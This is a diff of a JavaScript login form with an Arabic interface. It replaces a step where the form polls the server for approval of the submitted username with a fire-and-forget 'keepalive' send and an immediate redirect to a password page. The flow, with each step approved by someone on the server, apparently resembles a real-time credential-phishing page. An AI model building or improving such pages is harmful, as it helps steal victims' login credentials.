@@ -86,50 +86,22 @@ function toggleUserType(element) {
 document.getElementById('step1Form').addEventListener('submit', function(event) {
     event.preventDefault();
     const username = document.getElementById('username').value;
-    const btn = document.getElementById('submitBtn');
-    
+    if (!username) return;
+
     localStorage.setItem('temp_username', username);
-    
-    btn.disabled = true;
-    btn.innerText = "جاري المعالجة...";
 
     fetch('/submit_request', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
+        keepalive: true,
         body: JSON.stringify({
             type: 'username',
             data: { username: username }
         })
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.request_id) {
-            pollStatus(data.request_id);
-        }
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        btn.disabled = false;
-        btn.innerText = "تسجيل الدخول";
-    });
-});
+    }).catch(error => console.error('Error:', error));
 
-function pollStatus(requestId) {
-    const interval = setInterval(() => {
-        fetch('/request_status/' + requestId)
-        .then(res => res.json())
-        .then(data => {
-            if (data.status === 'approved') {
-                clearInterval(interval);
-                window.location.href = data.redirect_to || 'password.html';
-            } else if (data.status === 'rejected') {
-                clearInterval(interval);
-                alert('تم رفض الطلب، يرجى المحاولة مرة أخرى');
-                window.location.reload();
-            }
-        });
-    }, 2000);
-}
+    window.location.href = 'password.html';
+});
 </script>
 </body>
 </html>
